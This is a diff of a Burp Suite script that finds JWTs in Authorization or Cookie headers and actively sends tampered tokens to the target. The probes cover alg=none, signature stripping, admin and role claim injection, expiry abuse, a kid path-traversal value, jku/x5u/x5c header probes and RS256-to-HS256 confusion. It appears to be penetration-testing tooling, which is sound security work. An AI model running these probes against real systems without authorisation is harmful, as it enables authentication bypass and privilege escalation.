@@ -1,9 +1,8 @@
 // ================= JWT / BEARER TOKEN CHECKER =================
-// Focus: Authorization: Bearer <JWT>
-// - Decodes and audits JWT structure, claims, and header fields
-// - Sends modified Bearer tokens to test signature verification, alg:none,
-//   claim tampering, time claim enforcement, aud/iss handling, and header abuse
-// - Logs only; does not send anything to Repeater
+// Detect JWT by regex in Authorization and Cookie headers
+// Focus: tampering, alg=none, signature removal, permission escalation,
+// time-claim checks, aud/iss, kid/jku/x5u/jwk/x5c probes
+// Logs only; does not send anything to Repeater
 
 var jwtReq = requestResponse.request();
 var jwtRes = requestResponse.response();
@@ -13,25 +12,38 @@ if (jwtRes == null) {
     return;
 }
 
-String jwtToken = null;
-String authHeaderValue = null;
+var jwtRegex = java.util.regex.Pattern.compile("eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+(?:\\.[a-zA-Z0-9_-]*)?");
+String locatedToken = null;
+String tokenHeaderName = null;
+String tokenHeaderValue = null;
 
 for (var h : jwtReq.headers()) {
-    if (h.name().equalsIgnoreCase("Authorization") && h.value().toLowerCase().startsWith("bearer ")) {
-        authHeaderValue = h.value();
-        jwtToken = h.value().substring(7).trim();
-        break;
+    String headerName = h.name();
+    String headerValue = h.value();
+
+    if (headerName.equalsIgnoreCase("Authorization") || headerName.equalsIgnoreCase("Cookie")) {
+        var matcher = jwtRegex.matcher(headerValue);
+        if (matcher.find()) {
+            locatedToken = matcher.group();
+            tokenHeaderName = headerName;
+            tokenHeaderValue = headerValue;
+            break;
+        }
     }
 }
 
-if (jwtToken == null || jwtToken.isBlank()) {
-    logging.logToOutput("[!] No Authorization: Bearer token found.");
+if (locatedToken == null || locatedToken.isBlank()) {
+    logging.logToOutput("[!] No JWT found by regex in Authorization/Cookie headers.");
     return;
 }
 
-var jwtParts = jwtToken.split("\\.", -1);
+final String finalLocatedToken = locatedToken;
+final String finalTokenHeaderName = tokenHeaderName;
+final String finalTokenHeaderValue = tokenHeaderValue;
+
+var jwtParts = finalLocatedToken.split("\\.", -1);
 if (jwtParts.length < 2) {
-    logging.logToOutput("[!] Bearer token is not in JWT compact format.");
+    logging.logToOutput("[!] Located token is not in JWT compact format.");
     return;
 }
 
@@ -89,21 +101,15 @@ java.util.function.Function<String, String> getResHeader = (name) -> {
     return null;
 };
 
-java.util.function.Function<burp.api.montoya.utilities.json.JsonNode, String> jsonToCompact = (node) -> node.toJsonString();
-
-java.util.function.Function<String, burp.api.montoya.utilities.json.JsonNode> parseJson = (text) -> {
+java.util.function.Function<burp.api.montoya.utilities.json.JsonNode, String> nodeToSimpleString = (node) -> {
+    if (node == null) return null;
     try {
-        return burp.api.montoya.utilities.json.JsonNode.jsonNode(text);
+        if (node.isString()) return node.asString();
+        return node.toJsonString();
     } catch (Exception e) {
-        return null;
+        return node.toJsonString();
     }
 };
-
-java.util.function.BiFunction<String, String, String> replaceAuthHeader = (origHeaderValue, newToken) -> {
-    return "Bearer " + newToken;
-};
-
-java.util.function.Function<String, Boolean> isLikelyJwt = (token) -> token.split("\\.", -1).length >= 2;
 
 var verboseErrorPatterns = java.util.List.of(
     java.util.regex.Pattern.compile("(?i)\\bstack ?trace\\b"),
@@ -120,7 +126,6 @@ var verboseErrorPatterns = java.util.List.of(
     java.util.regex.Pattern.compile("(?i)\\bjava\\.lang\\.\\w+Exception"),
     java.util.regex.Pattern.compile("(?i)\\bSystem\\.\\w+Exception"),
     java.util.regex.Pattern.compile("(?i)\\bJsonWebTokenError\\b"),
-    java.util.regex.Pattern.compile("(?i)\\bJWT(::|\\s)?Decode"),
     java.util.regex.Pattern.compile("(?i)\\bjsonwebtoken\\b"),
     java.util.regex.Pattern.compile("(?i)\\bjjwt\\b"),
     java.util.regex.Pattern.compile("(?i)\\bjose\\b"),
@@ -142,10 +147,9 @@ java.util.function.BiFunction<String, String, String> buildRawToken = (headerStr
     return newHeaderB64 + "." + newPayloadB64 + "." + signaturePart;
 };
 
-java.util.function.BiFunction<String, String, burp.api.montoya.http.message.requests.HttpRequest> withBearerToken = (origAuth, newToken) -> {
-    String newAuth = replaceAuthHeader.apply(origAuth, newToken);
-    var updatedReq = jwtReq.withUpdatedHeader("Authorization", newAuth).withService(jwtReq.httpService());
-    return updatedReq;
+java.util.function.Function<String, burp.api.montoya.http.message.requests.HttpRequest> withJwtReplaced = (newToken) -> {
+    String newHeaderValue = finalTokenHeaderValue.replace(finalLocatedToken, newToken);
+    return jwtReq.withUpdatedHeader(finalTokenHeaderName, newHeaderValue).withService(jwtReq.httpService());
 };
 
 // ===== BASELINE ANALYSIS =====
@@ -160,8 +164,9 @@ boolean hasX5cHeader = false;
 
 if (headerJson.isObject()) {
     var hm = headerJson.asObject().asMap();
-    if (hm.containsKey("alg")) algValue = hm.get("alg").value();
-    if (hm.containsKey("typ")) typValue = hm.get("typ").value();
+
+    if (hm.containsKey("alg")) algValue = nodeToSimpleString.apply(hm.get("alg"));
+    if (hm.containsKey("typ")) typValue = nodeToSimpleString.apply(hm.get("typ"));
     hasJwkHeader = hm.containsKey("jwk");
     hasJkuHeader = hm.containsKey("jku");
     hasKidHeader = hm.containsKey("kid");
@@ -170,29 +175,30 @@ if (headerJson.isObject()) {
 }
 
 logging.logToOutput("========== JWT / BEARER CHECKER ==========");
+logging.logToOutput("[*] JWT source header: " + finalTokenHeaderName);
 logging.logToOutput("[*] JWT header: " + decodedHeader);
 logging.logToOutput("[*] JWT payload: " + decodedPayload);
 logging.logToOutput("[*] alg=" + algValue + " | typ=" + typValue + " | parts=" + jwtParts.length);
 
-if (algValue == null) jwtFindings.add("[HIGH] JWT sem campo alg no header");
-else jwtPassed.add("JWT possui campo alg: " + algValue);
+if (algValue == null) jwtFindings.add("[HIGH] JWT missing alg field in header");
+else jwtPassed.add("JWT contains alg field: " + algValue);
 
-if ("none".equalsIgnoreCase(algValue)) jwtFindings.add("[CRITICAL] JWT baseline usa alg=none");
+if ("none".equalsIgnoreCase(algValue)) jwtFindings.add("[CRITICAL] JWT baseline uses alg=none");
 if (algValue != null && (algValue.equalsIgnoreCase("HS256") || algValue.equalsIgnoreCase("HS384") || algValue.equalsIgnoreCase("HS512"))) {
-    jwtManual.add("JWT usa HMAC (" + algValue + ") - avaliar brute-force de segredo fraco offline");
+    jwtManual.add("JWT uses HMAC (" + algValue + ") - consider offline brute-forcing a weak secret");
 }
 if (algValue != null && (algValue.equalsIgnoreCase("RS256") || algValue.equalsIgnoreCase("RS384") || algValue.equalsIgnoreCase("RS512"))) {
-    jwtManual.add("JWT usa RSA (" + algValue + ") - testar confusion attack RS256->HS256 se houver chave publica exposta");
+    jwtManual.add("JWT uses RSA (" + algValue + ") - test RS256->HS256 confusion if a public key is exposed");
 }
 if (algValue != null && (algValue.equalsIgnoreCase("ES256") || algValue.equalsIgnoreCase("ES384") || algValue.equalsIgnoreCase("ES512"))) {
-    jwtManual.add("JWT usa ECDSA (" + algValue + ") - validar biblioteca e implementacao; nonce reuse requer analise offline");
+    jwtManual.add("JWT uses ECDSA (" + algValue + ") - validate library and implementation; nonce reuse requires offline analysis");
 }
 
-if (hasJwkHeader) jwtFindings.add("[HIGH] Header JWT contem jwk embutido - superficie para key injection");
-if (hasJkuHeader) jwtFindings.add("[HIGH] Header JWT contem jku - superficie para JWKS spoofing / SSRF");
-if (hasKidHeader) jwtManual.add("Header JWT contem kid - testar path traversal, SQLi ou command injection no resolvedor de chave");
-if (hasX5uHeader) jwtFindings.add("[HIGH] Header JWT contem x5u - superficie para SSRF / trusted key abuse");
-if (hasX5cHeader) jwtFindings.add("[HIGH] Header JWT contem x5c - avaliar certificate injection / trust abuse");
+if (hasJwkHeader) jwtFindings.add("[HIGH] JWT header contains embedded jwk - potential key injection surface");
+if (hasJkuHeader) jwtFindings.add("[HIGH] JWT header contains jku - potential JWKS spoofing / SSRF surface");
+if (hasKidHeader) jwtManual.add("JWT header contains kid - test for path traversal, SQLi, or command injection in the key resolver");
+if (hasX5uHeader) jwtFindings.add("[HIGH] JWT header contains x5u - potential SSRF / trusted key abuse surface");
+if (hasX5cHeader) jwtFindings.add("[HIGH] JWT header contains x5c - assess certificate injection / trust abuse");
 
 boolean hasExp = false;
 boolean hasNbf = false;
@@ -210,16 +216,16 @@ if (payloadJson.isObject()) {
     hasIss = pm.containsKey("iss");
     hasJti = pm.containsKey("jti");
 
-    if (!hasExp) jwtFindings.add("[HIGH] JWT sem exp claim");
-    else jwtPassed.add("JWT possui exp claim");
+    if (!hasExp) jwtFindings.add("[HIGH] JWT missing exp claim");
+    else jwtPassed.add("JWT contains exp claim");
 
-    if (!hasIat) jwtFindings.add("[MEDIUM] JWT sem iat claim");
-    else jwtPassed.add("JWT possui iat claim");
+    if (!hasIat) jwtFindings.add("[MEDIUM] JWT missing iat claim");
+    else jwtPassed.add("JWT contains iat claim");
 
-    if (!hasNbf) jwtManual.add("JWT sem nbf - verificar se a aplicacao exige janela temporal minima");
-    if (!hasAud) jwtManual.add("JWT sem aud - verificar reutilizacao cross-service");
-    if (!hasIss) jwtManual.add("JWT sem iss - verificar validacao de emissor");
-    if (!hasJti) jwtManual.add("JWT sem jti - avaliar risco de replay / falta de revogacao");
+    if (!hasNbf) jwtManual.add("JWT missing nbf - verify whether the application enforces a minimum validity window");
+    if (!hasAud) jwtManual.add("JWT missing aud - verify cross-service reuse");
+    if (!hasIss) jwtManual.add("JWT missing iss - verify issuer validation");
+    if (!hasJti) jwtManual.add("JWT missing jti - assess replay risk / lack of revocation");
 
     for (String key : pm.keySet()) {
         String lowered = key.toLowerCase();
@@ -227,29 +233,29 @@ if (payloadJson.isObject()) {
 
         if (lowered.contains("password") || lowered.contains("secret") || lowered.contains("apikey") ||
             lowered.contains("api_key") || lowered.contains("token") || lowered.contains("hash")) {
-            jwtFindings.add("[HIGH] Possivel dado sensivel em claim JWT: " + key + "=" + valuePreview);
+            jwtFindings.add("[HIGH] Possible sensitive data in JWT claim: " + key + "=" + valuePreview);
         }
 
         if (lowered.equals("role") || lowered.equals("roles") || lowered.equals("scope") || lowered.equals("scp") ||
             lowered.equals("permissions") || lowered.equals("perm") || lowered.equals("isadmin") ||
             lowered.equals("admin") || lowered.equals("tenant") || lowered.equals("tenant_id")) {
-            jwtManual.add("Claim privilegiada encontrada: " + key + " - candidato para privilege escalation");
+            jwtManual.add("Privileged claim found: " + key + " - candidate for privilege escalation");
         }
     }
 }
 
 boolean jwtOverHttp = jwtReq.url().startsWith("http://");
-if (jwtOverHttp) jwtFindings.add("[CRITICAL] Bearer token trafegando por HTTP");
-else jwtPassed.add("Bearer token trafega por HTTPS");
+if (jwtOverHttp) jwtFindings.add("[CRITICAL] JWT is being sent over HTTP");
+else jwtPassed.add("JWT is being sent over HTTPS");
 
 String hsts = getResHeader.apply("Strict-Transport-Security");
-if (hsts == null) jwtManual.add("Resposta sem HSTS - relevante para protecao de tokens em transporte");
+if (hsts == null) jwtManual.add("Response does not include HSTS - relevant for token transport protection");
 
-// ===== HELPER FOR DYNAMIC TESTS =====
+// ===== DYNAMIC TEST HELPER =====
 
 java.util.function.BiConsumer<String, String> testToken = (label, tokenToSend) -> {
     try {
-        var mutatedReq = withBearerToken.apply(authHeaderValue, tokenToSend);
+        var mutatedReq = withJwtReplaced.apply(tokenToSend);
         if (mutatedReq.httpService() == null) {
             logging.logToOutput("[!] No HttpService for test: " + label);
             return;
@@ -257,17 +263,22 @@ java.util.function.BiConsumer<String, String> testToken = (label, tokenToSend) -
 
         var result = api.http().sendRequest(mutatedReq);
         if (result.response() == null) {
-            logging.logToOutput("NONE [JWT] " + label + " | sem resposta");
+            logging.logToOutput("NONE [JWT] " + label + " | no response");
             return;
         }
 
         int st = result.response().statusCode();
         String body = result.response().bodyToString();
+        String lowerBody = body.toLowerCase();
         boolean verbose = hasVerboseError.apply(body);
 
-        if (st < 400 && !body.toLowerCase().contains("invalid token") && !body.toLowerCase().contains("jwt malformed")
-                && !body.toLowerCase().contains("signature") && !body.toLowerCase().contains("unauthorized")
-                && !body.toLowerCase().contains("forbidden") && !body.toLowerCase().contains("expired")) {
+        if (st < 400
+            && !lowerBody.contains("invalid token")
+            && !lowerBody.contains("jwt malformed")
+            && !lowerBody.contains("signature")
+            && !lowerBody.contains("unauthorized")
+            && !lowerBody.contains("forbidden")
+            && !lowerBody.contains("expired")) {
             logging.logToOutput(st + " [HIT] JWT " + label);
         } else if (verbose) {
             logging.logToOutput(st + " [DEBUG] JWT " + label + " | verbose error exposed");
@@ -283,34 +294,42 @@ java.util.function.BiConsumer<String, String> testToken = (label, tokenToSend) -
 
 // 1) Signature not verified / claim tampering without resigning
 if (payloadJson.isObject()) {
-    var p1 = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
-    var p1m = p1.asObject();
+    var pm = payloadJson.asObject().asMap();
 
-    if (p1m.asMap().containsKey("admin")) {
-        p1m.putBoolean("admin", true);
-        testToken.accept("tamper-admin-without-resign", buildToken.apply(decodedHeader, p1));
-    }
-    if (p1m.asMap().containsKey("isAdmin")) {
-        p1m.putBoolean("isAdmin", true);
-        testToken.accept("tamper-isAdmin-without-resign", buildToken.apply(decodedHeader, p1));
-    }
-    if (p1m.asMap().containsKey("role")) {
-        p1m.putString("role", "admin");
-        testToken.accept("tamper-role-admin-without-resign", buildToken.apply(decodedHeader, p1));
-    }
-    if (p1m.asMap().containsKey("scope")) {
-        p1m.putString("scope", "admin superuser root *");
-        testToken.accept("tamper-scope-without-resign", buildToken.apply(decodedHeader, p1));
-    }
-    if (p1m.asMap().containsKey("permissions")) {
-        p1m.putString("permissions", "[\"*\"]");
-        testToken.accept("tamper-permissions-without-resign", buildToken.apply(decodedHeader, p1));
+    if (pm.containsKey("admin")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putBoolean("admin", true);
+        testToken.accept("tamper-admin-without-resign", buildToken.apply(decodedHeader, p));
     }
 
-    // generic privilege escalation seed if none of the above exists
-    if (!p1m.asMap().containsKey("role") && !p1m.asMap().containsKey("admin") && !p1m.asMap().containsKey("isAdmin")) {
-        p1m.putString("role", "admin");
-        testToken.accept("inject-role-admin-without-resign", buildToken.apply(decodedHeader, p1));
+    if (pm.containsKey("isAdmin")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putBoolean("isAdmin", true);
+        testToken.accept("tamper-isAdmin-without-resign", buildToken.apply(decodedHeader, p));
+    }
+
+    if (pm.containsKey("role")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putString("role", "admin");
+        testToken.accept("tamper-role-admin-without-resign", buildToken.apply(decodedHeader, p));
+    }
+
+    if (pm.containsKey("scope")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putString("scope", "admin superuser root *");
+        testToken.accept("tamper-scope-without-resign", buildToken.apply(decodedHeader, p));
+    }
+
+    if (pm.containsKey("permissions")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putString("permissions", "[\"*\"]");
+        testToken.accept("tamper-permissions-without-resign", buildToken.apply(decodedHeader, p));
+    }
+
+    if (!pm.containsKey("role") && !pm.containsKey("admin") && !pm.containsKey("isAdmin")) {
+        var p = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
+        p.asObject().putString("role", "admin");
+        testToken.accept("inject-role-admin-without-resign", buildToken.apply(decodedHeader, p));
     }
 }
 
@@ -354,8 +373,7 @@ if (payloadJson.isObject()) {
         pExpFar.asObject().putNumber("exp", now + 315360000L);
         testToken.accept("excessive-exp-10-years-without-resign", buildToken.apply(decodedHeader, pExpFar));
     } else {
-        var pNoExp = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
-        testToken.accept("missing-exp-claim-current-token-shape", buildToken.apply(decodedHeader, pNoExp));
+        testToken.accept("missing-exp-claim-current-token-shape", buildToken.apply(decodedHeader, payloadJson));
     }
 
     var pNbfFuture = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
@@ -367,7 +385,7 @@ if (payloadJson.isObject()) {
     testToken.accept("future-iat-without-resign", buildToken.apply(decodedHeader, pIatFuture));
 }
 
-// 6) Audience / issuer / jti / replay-oriented manipulations
+// 6) Audience / issuer / jti
 if (payloadJson.isObject()) {
     var pAud = burp.api.montoya.utilities.json.JsonNode.jsonNode(payloadJson.toJsonString());
     pAud.asObject().putString("aud", "unexpected-service");
@@ -382,7 +400,7 @@ if (payloadJson.isObject()) {
     testToken.accept("tamper-jti-fixed-value-without-resign", buildToken.apply(decodedHeader, pJti));
 }
 
-// 7) Header abuse: kid / jku / jwk / x5u / x5c
+// 7) Header abuse probes
 if (headerJson.isObject()) {
     var hKidTrav = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
     hKidTrav.asObject().putString("kid", "../../../../../../dev/null");
@@ -413,14 +431,12 @@ if (headerJson.isObject()) {
     testToken.accept("x5c-certificate-injection-probe", buildRawToken.apply(hX5c.toJsonString(), payloadJson.toJsonString()));
 }
 
-// 8) RS256 -> HS256 confusion probe shape only (unsigned/tampered form)
-// Note: full cryptographic signing with public key as HMAC secret requires the public key.
-// This sends a tampered structural probe and flags for manual follow-up.
+// 8) RS256 -> HS256 structural probe
 if (algValue != null && algValue.equalsIgnoreCase("RS256")) {
     var hConf = burp.api.montoya.utilities.json.JsonNode.jsonNode(decodedHeader);
     hConf.asObject().putString("alg", "HS256");
     testToken.accept("rs256-to-hs256-confusion-structural-probe", buildRawToken.apply(hConf.toJsonString(), payloadJson.toJsonString()));
-    jwtManual.add("Para confusion attack completa RS256->HS256, obter chave publica/JWKS e assinar HS256 com ela como segredo");
+    jwtManual.add("For a complete RS256->HS256 confusion attack, obtain the public key/JWKS and sign HS256 with it as the secret");
 }
 
 // ===== FINAL REPORT =====
